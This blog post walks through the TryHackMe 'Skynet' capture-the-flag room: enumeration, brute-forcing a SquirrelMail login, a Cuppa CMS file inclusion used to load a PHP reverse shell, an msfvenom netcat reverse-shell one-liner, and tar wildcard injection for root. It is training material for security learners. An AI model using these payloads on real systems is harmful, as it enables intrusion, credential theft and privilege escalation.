---
layout: post
title:  "Tryhackme Walkthough - Skynet"
date:   2021-02-28 08:18:19 -0800
categories: tryhackme
---
There isn't much information about this room on the [Tryhackme](https://tryhackme.com/room/skynet) page apart from that it is a Terminator themed machine so we will jump right in. 

## Initial Enumeration
The nmap scan show the following ports open 

```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: ...
```

The webste on port 80 shows this page but looking at the source there isn't much else to enumerate. 

![](/assets/img/20210228074256.png)

I ran a gobuster scan and that found the following folders. 

```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/config (Status: 301)
/css (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/squirrelmail (Status: 301)
==============================
```

The most interesting one here is the `/squirrelmail` and navigating to it shows a log in screen. 

![](/assets/img/20210228081225.png)

I checked the Exploit DB to see if there was something available for version 1.423 but nothing stood out as being worth trying at this stage. 

### Enumerating SMB
I ran enum4linx and the output showed 4 shares one of which was anonymous

```
//10.10.237.154/print$  Mapping: DENIED, Listing: N/A
//10.10.237.154/anonymous       Mapping: OK, Listing: OK
//10.10.237.154/milesdyson      Mapping: DENIED, Listing: N/A
//10.10.237.154/IPC$    [E] Can't understand response:
```

Using smbclient without a password, I discovered a file called `attention.txt`

```
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ smbclient -U Anonymous //$IP/anonymous
Enter WORKGROUP\Anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5829532 blocks available
smb: \> mget attention.txt
Get file attention.txt? yes
getting file \attention.txt of size 163 as attention.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```

This file contained the following text:-

```
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
```

I also navigated to the logs directory which contained 3 log files

```
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019
 ...
 ```
 
 Two were zero bytes but the `log1.txt` contains a list of what could be passwords. 
 
 ```
 (dspo6㉿kali)[~/pentest/boxes/thm/Skynet/smb]$ cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
 ```

## Logging in to Email and then SMB

Going back to the squirrel mail login page, I launched Burpsuite intruder with the list of potential passwords and the name milesdyson that I saw in SMB enumeration. 

[![](/assets/img/20210228075545.png)](/assets/img/20210228075545.png)

[![](/assets/img/20210228075749.png)](/assets/img/20210228075749.png)

Looks like `cyborg007haloterminator` is the password and we are in.

![](/assets/img/20210228075833.png)

And the first email mentions a  password 

![](/assets/img/20210228080713.png)

Which I then try with the open share for milesdyson found earlier.

```
(dspo6㉿kali)[](~/pentest/boxes/thm/Skynet]$ smbclient -U milesdyson //10.10.174.240/milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
```

Navigating to the notes directory, I see that there is a file called `important.txt` with the following text.

```
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
```

## CMS Enumeration 

Navigating to to the folder mentioned in the `important.txt` file we find this page. 

![/assets/img/20210228081847.png)

I decide to run gobuster again on this page and the output shows that there is an administrator page

```
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ gobuster dir -u 10.10.174.240/45kra24zxs28v3yd  -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.174.240/45kra24zxs28v3yd
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/23 20:01:43 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
===============================================================
2021/02/23 20:03:00 Finished
===============================================================
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
```

The CMS running is Cuppa CMS

![](/assets/img/20210228082043.png)

## CMS Exploitation
Searchspolit leads to this exploit [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971)  

```
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ searchsploit cuppa
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                          | php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
```

I try the exploit to see if it works and it does

```
http://10.10.125.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```


![](/assets/img/20210228082507.png)

I now try to upload a PHP reverse shell from a webserver on my machine. 

```
(dspo6㉿kali)\[~/pentest/boxes/thm/Skynet\]$ curl http://10.10.125.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.2.175/php-reverse-shell.php
```

It works - we are in!

## Getting the User Flag

```
(dspo6㉿kali)[~]$ nc -lvnp 9003
listening on [any] 9003 ...
connect to [10.2.2.175] from (UNKNOWN) [10.10.125.81] 46742
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:38:51 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

I stabilize the shell

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                                      
www-data@skynet:/usr$ export TERM=xterm                                                                                               
export TERM=xterm                                                                                                                     
www-data@skynet:/usr$ stty raw -echo; fg                                                                                              
stty raw -echo; fg                                                                                                                    
bash: fg: current: no such job                                                                                                        
www-data@skynet:/usr$    
```

And get the flag

```
www-data@skynet:/$ ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@skynet:/$ cd home
www-data@skynet:/home$ ls
milesdyson
www-data@skynet:/home$ cd milesdyson
www-data@skynet:/home/milesdyson$ ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
xxxe5c2109a40f95809xxxxxxx
www-data@skynet:/home/milesdyson$ 
```



## Escalation
We are currently running under the www-data account.

Using the password we found earlier I can change to the milesdyson account but that doesn't help us right now. 

```
www-data@skynet:/home/milesdyson$ su milesdyson
Password: cyborg007haloterminator  

milesdyson@skynet:
```


I checked to see if there were any cron jobs running and found one called backup.sh that ran every minute

```
www-data@skynet:/home/milesdyson$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson$ 
```

Unfortunately, this is running under root. 

Looking at the script I see  this. 

```
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson/backups$ 
```



## Brick Wall
After trying many things, I hit a brick wall and was stuck so I had to resort to trying to find a hint on the web. 

It was this research that led me to this walktough on YouTube by [John Hammond](https://youtu.be/HXikLrFVIXc) which highlighted a technique, tar wildcard injection which can be read about on this [site](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/).


## Escalation (Resumed)
I created reverse netcat shellcode using msfvenom

```
(dspo6㉿kali)[~/pentest/pentest_utils/shells]$ msfvenom -p cmd/unix/reverse_netcat lhost=10.2.2.175 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 88 bytes
mkfifo /tmp/pbwq; nc 10.2.2.175 8888 0</tmp/pbwq | /bin/sh >/tmp/pbwq 2>&1; rm /tmp/pbwq
(dspo6㉿kali)[~/pentest/pentest_utils/shells]$
```

I then created a script on the target using this shellcode and copied it to the folder being backup by the cron job. 

```
www-data@skynet:/dev/shm$ echo "mkfifo /tmp/pbwq; nc 10.2.2.175 8888 0</tmp/pbwq | /bin/sh >/tmp/pbwq 2>&1; rm /tmp/pbwq
> " > shell.sh
www-data@skynet:/dev/shm$
www-data@skynet:/dev/shm$ cp shell.sh /var/www/html
```

I then ran through the steps indicated on the tar wildcard page and waited for the backup cron job to run. 

```
www-data@skynet:/dev/shm$ cp --checkpoint=1 /var/www/html
cp: unrecognized option '--checkpoint=1'
Try 'cp --help' for more information.
www-data@skynet:/dev/shm$ cd /var/www/html
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
```

Shell acheived. 

```
(dspo6㉿kali)[~]$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.2.175] from (UNKNOWN) [10.10.184.206] 55396
ls
45kra24zxs28v3yd
admin
ai
--checkpoint-action=exec=sh shell.sh
config
css
image.png
index.html
js
shell.sh
style.css
cd ..
ls
html
cd ..
cd /root
ls
root.txt
cat root.txt
XXX4753accc7179a282XXX
````

**Note:** the tar wildcard exploit says that there is one more command but I got a shell before I executed it.

```
echo "" > --checkpoint=1
```


## Conclusion
The first half of owning this box was fun but it was frustrating to have to resort to checking other walkthroughs to make progress at the escalation part. 

Since I am still learning these techniques, maybe it is not all that bad. I found out about something new and maybe I will be able to use this knowledge in the future. 